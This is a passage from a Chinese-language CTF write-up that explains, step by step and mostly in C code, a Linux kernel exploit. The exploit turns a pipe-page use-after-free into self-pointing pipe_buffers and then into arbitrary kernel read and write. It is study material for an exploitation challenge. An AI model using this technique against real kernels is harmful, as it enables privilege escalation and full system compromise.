class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c">read(pipe_fd[victim_pid][<span class="hljs-number">0</span>], buf, SND_PIPE_BUF_SZ - <span class="hljs-number">8</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>read(pipe_fd[victim_pid][<span class="hljs-number">0</span>], &amp;info_pipe_buf, <span class="hljs-keyword">sizeof</span>(info_pipe_buf));<br>  <br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[?] info_pipe_buf-&gt;page: \033[0m%p\n&quot;</span> <br>       <span class="hljs-string">&quot;\033[34m\033[1m[?] info_pipe_buf-&gt;ops: \033[0m%p\n&quot;</span>, <br>       info_pipe_buf.page, info_pipe_buf.ops);<br>  <br><span class="hljs-keyword">if</span>((<span class="hljs-type">size_t</span>) info_pipe_buf.page &lt; <span class="hljs-number">0xffff000000000000</span> || (<span class="hljs-type">size_t</span>) info_pipe_buf.ops &lt; <span class="hljs-number">0xffffffff81000000</span>)<br>&#123;<br>    err_exit(<span class="hljs-string">&quot;FAILED to re-hit victim page!&quot;</span>);<br>&#125;<br>  <br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successfully to hit the UAF page!\033[0m&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Got page leak:\033[0m %p\n&quot;</span>, info_pipe_buf.page);<br></code></pre></td></tr></table></figure><p>解释一下读写数据量的计算，先是read</p><ul><li><p>由于之前已经读取了8+4字节用于判断page重叠是否成功，所以此时offset为12，想要读取在pipe_buffer结构体开始的成员就只能读取下一个slab-96的pipe_buffer</p><img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/read1.png" class title="read1"></li><li><p>所以要先读取96-8-4字节才能读到第二个slab-96的pipe_buffer</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">read(pipe_fd[victim_pid][<span class="hljs-number">0</span>], buf, SND_PIPE_BUF_SZ - <span class="hljs-number">8</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br></code></pre></td></tr></table></figure><img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/read2.png" class title="read2"></li></ul><p>再解释一下write的数据量计算</p><ul><li><p>由于write的偏移一定在read之后，所以要想更改pipe_buffer只能改第三个slab-96的piipe_buffer（前两个用于read了）</p></li><li><p>之前已经向pipe中写入了8 * 5 + 4 * 2字节，所以要先write这么多👇字节来保证此时write的偏移位于第三个slab-96的pipe_buffer</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">write(pipe_fd[victim_pid][<span class="hljs-number">1</span>], buf, SND_PIPE_BUF_SZ*<span class="hljs-number">2</span> - <span class="hljs-number">40</span> - <span class="hljs-number">2</span>*<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br></code></pre></td></tr></table></figure><img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/write1.png" class title="write1"></li></ul></li><li><p>更改pipe_buffer-&gt;page制造第二个uaf，并确定victim pipe_buffer的序号snd_vicitm_pid</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] construct a second-level uaf pipe page...&quot;</span>);<br>info_pipe_buf.page = (<span class="hljs-keyword">struct</span> page*)((<span class="hljs-type">size_t</span>) info_pipe_buf.page + <span class="hljs-number">0x40</span>);<br>write(pipe_fd[victim_pid][<span class="hljs-number">1</span>], &amp;info_pipe_buf, <span class="hljs-keyword">sizeof</span>(info_pipe_buf));<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)<br>&#123;<br>    <span class="hljs-type">char</span> a3_str[<span class="hljs-number">0x10</span>];<br>    <span class="hljs-type">int</span> nr;<br>    <span class="hljs-built_in">memset</span>(a3_str, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-keyword">sizeof</span>(a3_str));<br>    <span class="hljs-keyword">if</span>(i == orig_pid || i == victim_pid)<br>    &#123;<br>        <span class="hljs-keyword">continue</span>;<br>    &#125;<br>    read(pipe_fd[i][<span class="hljs-number">0</span>], a3_str, <span class="hljs-number">8</span>);<br>    read(pipe_fd[i][<span class="hljs-number">0</span>], &amp;nr, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>    <span class="hljs-keyword">if</span>(nr &lt; PIPE_SPRAY_NUM &amp;&amp; i != nr)<br>    &#123;<br>        snd_orig_pid = nr;<br>        snd_vicitm_pid = i;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found second-level victim: \033[0m%d &quot;</span><br>               <span class="hljs-string">&quot;\033[32m\033[1m, orig: \033[0m%d\n&quot;</span>, <br>               snd_vicitm_pid, snd_orig_pid);<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(snd_vicitm_pid == <span class="hljs-number">-1</span>)<br>&#123;<br>    err_exit(<span class="hljs-string">&quot;FAILED to corrupt second-level pipe_buffer!&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/write2.png" class title="write2"></li></ul><p>进入眼花缭乱的阶段(ˉ▽ˉ；)…，building_self_writing_pipe</p><ul><li><p>我们要再次将uaf的page分配为pipe_buffer，这次选择slab-192，逻辑与上次一致</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">size_t</span> buf[<span class="hljs-number">0x1000</span>];<br><span class="hljs-type">size_t</span> trd_pipe_sz = <span class="hljs-number">0x1000</span> * (TRD_PIPE_BUF_SZ/<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pipe_buffer));<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> <span class="hljs-title">evil_pipe_buf</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page_ptr</span>;</span><br>  <br><span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(buf));<br></code></pre></td></tr></table></figure><p>这次我们要改写第二个slab-192的pipe_buffer（之前已写入40 + 2 * 4字节）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* let the page&#x27;s ptr at pipe_buffer */</span><br>write(pipe_fd[snd_vicitm_pid][<span class="hljs-number">1</span>], buf, TRD_PIPE_BUF_SZ - <span class="hljs-number">40</span> - <span class="hljs-number">2</span>*<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>  <br><span class="hljs-comment">/* free orignal pipe&#x27;s page */</span><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] free second-level original pipe...&quot;</span>);<br>close(pipe_fd[snd_orig_pid][<span class="hljs-number">0</span>]);<br>close(pipe_fd[snd_orig_pid][<span class="hljs-number">1</span>]);<br>  <br><span class="hljs-comment">/* try to rehit victim page by reallocating pipe_buffer */</span><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] fcntl() to set the pipe_buffer on second-level victim page...&quot;</span>);<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)<br>&#123;<br>    <span class="hljs-keyword">if</span>(i == orig_pid || i == victim_pid || i == snd_orig_pid || i == snd_vicitm_pid)<br>    &#123;<br>        <span class="hljs-keyword">continue</span>;<br>    &#125;<br>  <br>    <span class="hljs-keyword">if</span>(fcntl(pipe_fd[i][<span class="hljs-number">1</span>], F_SETPIPE_SZ, trd_pipe_sz) &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed to resize %d pipe!\n&quot;</span>, i);<br>        err_exit(<span class="hljs-string">&quot;FAILED to re-alloc pipe_buffer!&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>更改第二个slab-192的pipe_buffer</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* let a pipe-&gt;bufs pointing to itself */</span><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] hijacking the 2nd pipe_buffer on page to itself...&quot;</span>);<br>evil_pipe_buf.page = info_pipe_buf.page;<br>evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;<br>evil_pipe_buf.len = TRD_PIPE_BUF_SZ;<br>evil_pipe_buf.ops = info_pipe_buf.ops;<br>evil_pipe_buf.flags = info_pipe_buf.flags;<br>evil_pipe_buf.private = info_pipe_buf.private;<br>  <br>write(pipe_fd[snd_vicitm_pid][<span class="hljs-number">1</span>], &amp;evil_pipe_buf, <span class="hljs-keyword">sizeof</span>(evil_pipe_buf));<br></code></pre></td></tr></table></figure><img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/slf-point.png" class title="slf-point"></li><li><p>检查劫持是否成功（根据pipe_buffer-&gt;page），确定第一个self-pointing pipe_buffer序号self_2nd_pipe_pid</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* check for third-level victim pipe */</span><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)<br>&#123;<br>    <span class="hljs-keyword">if</span> (i == orig_pid || i == victim_pid || i == snd_orig_pid || i == snd_vicitm_pid)<br>    &#123;<br>        <span class="hljs-keyword">continue</span>;<br>    &#125;<br>  <br>    read(pipe_fd[i][<span class="hljs-number">0</span>], &amp;page_ptr, <span class="hljs-keyword">sizeof</span>(page_ptr));<br>    <span class="hljs-keyword">if</span>(page_ptr == evil_pipe_buf.page)<br>    &#123;<br>        self_2nd_pipe_pid = i;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found self-writing pipe: \033[0m%d\n&quot;</span>, <br>                self_2nd_pipe_pid);<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125;<br>  <br><span class="hljs-keyword">if</span>(self_2nd_pipe_pid == <span class="hljs-number">-1</span>)<br>&#123;<br>    err_exit(<span class="hljs-string">&quot;FAILED to build a self-writing pipe!&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>获得第二个self-pointing pipe_buffer，确定序号self_3rd_pipe_pid，这时更改的是第三个slab-192的pipe_buffer</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* overwrite the 3rd pipe_buffer to this page too */</span><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] hijacking the 3rd pipe_buffer on page to itself...&quot;</span>);<br>evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;<br>evil_pipe_buf.len = TRD_PIPE_BUF_SZ;<br>  <br>write(pipe_fd[snd_vicitm_pid][<span class="hljs-number">1</span>],buf,TRD_PIPE_BUF_SZ-<span class="hljs-keyword">sizeof</span>(evil_pipe_buf));<br>write(pipe_fd[snd_vicitm_pid][<span class="hljs-number">1</span>], &amp;evil_pipe_buf, <span class="hljs-keyword">sizeof</span>(evil_pipe_buf));<br>  <br><span class="hljs-comment">/* check for third-level victim pipe */</span><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)<br>&#123;<br>    <span class="hljs-keyword">if</span> (i == orig_pid || i == victim_pid || i == snd_orig_pid || i == snd_vicitm_pid || i == self_2nd_pipe_pid)<br>    &#123;<br>        <span class="hljs-keyword">continue</span>;<br>    &#125;<br>  <br>    read(pipe_fd[i][<span class="hljs-number">0</span>], &amp;page_ptr, <span class="hljs-keyword">sizeof</span>(page_ptr));<br>    <span class="hljs-keyword">if</span>(page_ptr == evil_pipe_buf.page)<br>    &#123;<br>        self_3rd_pipe_pid = i;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found another self-writing pipe:\033[0m&quot;</span><br>                <span class="hljs-string">&quot;%d\n&quot;</span>, self_3rd_pipe_pid);<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125;<br>  <br><span class="hljs-keyword">if</span>(self_3rd_pipe_pid == <span class="hljs-number">-1</span>)<br>&#123;<br>    err_exit(<span class="hljs-string">&quot;FAILED to build a self-writing pipe!&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/slf-point1.png" class title="slf-point1"></li><li><p>获得第三个self-pointing pipe_buffer，确定序号self_4th_pipe_pid，这时更改的是第四个slab-192的pipe_buffer</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* overwrite the 4th pipe_buffer to this page too */</span><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] hijacking the 4th pipe_buffer on page to itself...&quot;</span>);<br>evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;<br>evil_pipe_buf.len = TRD_PIPE_BUF_SZ;<br>  <br>write(pipe_fd[snd_vicitm_pid][<span class="hljs-number">1</span>],buf,TRD_PIPE_BUF_SZ-<span class="hljs-keyword">sizeof</span>(evil_pipe_buf));<br>write(pipe_fd[snd_vicitm_pid][<span class="hljs-number">1</span>], &amp;evil_pipe_buf, <span class="hljs-keyword">sizeof</span>(evil_pipe_buf));<br>  <br><span class="hljs-comment">/* check for third-level victim pipe */</span><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)<br>&#123;<br>    <span class="hljs-keyword">if</span>(i == orig_pid || i == victim_pid || i == snd_orig_pid || i == snd_vicitm_pid || i == self_2nd_pipe_pid || i== self_3rd_pipe_pid)<br>    &#123;<br>        <span class="hljs-keyword">continue</span>;<br>    &#125;<br>  <br>    read(pipe_fd[i][<span class="hljs-number">0</span>], &amp;page_ptr, <span class="hljs-keyword">sizeof</span>(page_ptr));<br>    <span class="hljs-keyword">if</span>(page_ptr == evil_pipe_buf.page)<br>    &#123;<br>        self_4th_pipe_pid = i;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found another self-writing pipe:\033[0m&quot;</span><br>                <span class="hljs-string">&quot;%d\n&quot;</span>, self_4th_pipe_pid);<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125;<br>  <br><span class="hljs-keyword">if</span> (self_4th_pipe_pid == <span class="hljs-number">-1</span>) &#123;<br>    err_exit(<span class="hljs-string">&quot;FAILED to build a self-writing pipe!&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/slf-point2.png" class title="slf-point2"></li><li><p>以上过程<strong>大部分pipe</strong>需要读取2次<strong>8字节字符串+4字节序号</strong>，三次<strong>8字节指针</strong>，所以最开始需要这么write👇</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br>write(pipe_fd[i][<span class="hljs-number">1</span>], &amp;i, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br>write(pipe_fd[i][<span class="hljs-number">1</span>], &amp;i, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br>write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br>write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br></code></pre></td></tr></table></figure></li></ul><p><em><strong>ps：因为开启了Random freelist，所以获取的self-pointing pipe_buffer的序号可能不是连续的</strong></em></p><img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/random.png" class title="random"><h2 id="任意读写"><a href="#任意读写" class="headerlink" title="任意读写"></a>任意读写</h2><p>现在我们有三个self-pointing pipe_buffer</p><ul><li>第一个管道用以进行内存空间中的任意读写，我们通过修改其 page 指针完成</li><li>第二个管道用以修改第三个管道，使其写入的起始位置指向第一个管道</li><li>第三个管道用以修改第一个与第二个管道，使得第一个管道的 pipe 指针指向指定位置，第二个管道的写入起始位置指向第三个管道</li></ul><p>继续exp</p><ul><li><p>先调用setup_evil_pipe进行一些初始化</p><ul><li><p>先进行一些覆盖</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">memcpy</span>(&amp;evil_2nd_buf, &amp;info_pipe_buf, <span class="hljs-keyword">sizeof</span>(evil_2nd_buf));<br><span class="hljs-built_in">memcpy</span>(&amp;evil_3rd_buf, &amp;info_pipe_buf, <span class="hljs-keyword">sizeof</span>(evil_3rd_buf));<br><span class="hljs-built_in">memcpy</span>(&amp;evil_4th_buf, &amp;info_pipe_buf, <span class="hljs-keyword">sizeof</span>(evil_4th_buf));<br></code></pre></td></tr></table></figure></li><li><p>第一个管道用于进行任意读写，先将read初始化为页开始，write初始化为页尾</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">evil_2nd_buf.offset = <span class="hljs-number">0</span>;<br>evil_2nd_buf.len = <span class="hljs-number">0xff0</span>;<br></code></pre></td></tr></table></figure><img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/pipe2.png" class title="pipe2"></li><li><p>第二个管道用于修改第三个管道，所以利用第三个管道修改第二个管道，read，write都指向第三个管道（初始化时第三个管道的read指向第一个管道，write指向第二个管道）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">evil_3rd_buf.offset = TRD_PIPE_BUF_SZ * <span class="hljs-number">3</span>;<br>evil_3rd_buf.len = <span class="hljs-number">0</span>;<br>write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>], &amp;evil_3rd_buf, <span class="hljs-keyword">sizeof</span>(evil_3rd_buf));<br></code></pre></td></tr></table></figure><img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/pipe3.png" class title="pipe3"></li><li><p>第三个管道用于修改第一第二个管道，所以write，read都指向第一个管道（在每次任意读写时初始化）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">evil_4th_buf.offset = TRD_PIPE_BUF_SZ;<br>evil_4th_buf.len = <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure></li></ul></li><li><p>初始化完毕就可以任意读写了，先是读arbitrary_read_by_pipe</p><ul><li><p>书接上回，每次任意读写的时候要使用pipe2初始化pipe3</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* hijack the 4th pipe pointing to 2nd pipe */</span><br>write(pipe_fd[self_3rd_pipe_pid][<span class="hljs-number">1</span>], &amp;evil_4th_buf, <span class="hljs-keyword">sizeof</span>(evil_4th_buf));<br></code></pre></td></tr></table></figure><img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/read11.png" class title="read11"></li><li><p>使用pipe3修改pipe1，指向要读写的页并初始化read指向页开始</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* page to read */</span><br>evil_2nd_buf.offset = <span class="hljs-number">0</span>;<br>evil_2nd_buf.len = <span class="hljs-number">0x1ff8</span>;<br>evil_2nd_buf.page = page_to_read;<br>    <br><span class="hljs-comment">/* hijack the 2nd pipe for arbitrary read */</span><br>write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>], &amp;evil_2nd_buf, <span class="hljs-keyword">sizeof</span>(evil_2nd_buf));<br></code></pre></td></tr></table></figure><img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/read22.png" class title="read22"><p>接下来的write是为了跳过pipe1，准备修改pipe2</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>], <br>      temp_zero_buf, <br>      TRD_PIPE_BUF_SZ-<span class="hljs-keyword">sizeof</span>(evil_2nd_buf));<br></code></pre></td></tr></table></figure><img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/read33.png" class title="read33"></li><li><p>最开始pipe2用于初始化pipe3了，这里使用pipe3把pipe2再改回去</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* hijack the 3rd pipe to point to 4th pipe */</span><br>write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>], &amp;evil_3rd_buf, <span class="hljs-keyword">sizeof</span>(evil_3rd_buf));<br></code></pre></td></tr></table></figure><img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/read44.png" class title="read44"></li><li><p>最终目的——把数据读出来</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* read out data */</span><br>read(pipe_fd[self_2nd_pipe_pid][<span class="hljs-number">0</span>], dst, <span class="hljs-number">0xfff</span>);<br></code></pre></td></tr></table></figure><img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/read55.png" class title="read55"></li></ul></li><li><p>任意写arbitrary_write_by_pipe和任意读思路一致（除了pipe1的write的指向）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">arbitrary_write_by_pipe</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> page *page_to_write, <span class="hljs-type">void</span> *src, <span class="hljs-type">size_t</span> len)</span><br>&#123;<br>    <span class="hljs-comment">/* page to write */</span><br>    evil_2nd_buf.page = page_to_write;<br>    evil_2nd_buf.offset = <span class="hljs-number">0</span>;<br>    evil_2nd_buf.len = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">/* hijack the 4th pipe pointing to 2nd pipe */</span><br>    write(pipe_fd[self_3rd_pipe_pid][<span class="hljs-number">1</span>], &amp;evil_4th_buf, <span class="hljs-keyword">sizeof</span>(evil_4th_buf));<br><br>    <span class="hljs-comment">/* hijack the 2nd pipe for arbitrary read, 3rd pipe point to 4th pipe */</span><br>    write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>], &amp;evil_2nd_buf, <span class="hljs-keyword">sizeof</span>(evil_2nd_buf));<br>    write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>], <br>          temp_zero_buf, <br>          TRD_PIPE_BUF_SZ - <span class="hljs-keyword">sizeof</span>(evil_2nd_buf));<br>    <br>    <span class="hljs-comment">/* hijack the 3rd pipe to point to 4th pipe */</span><br>    write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>], &amp;evil_3rd_buf, <span class="hljs-keyword">sizeof</span>(evil_3rd_buf));<br><br>    <span class="hljs-comment">/* write data into dst page */</span><br>    write(pipe_fd[self_2nd_pipe_pid][<span class="hljs-number">1</span>], src, len);<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h3 id="任意读写设计思路"><a href="#任意读写设计思路" class="headerlink" title="任意读写设计思路"></a>任意读写设计思路</h3><p>到利用uaf泄露page这一步都是惯常操作</p><img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/uaf2.png" class 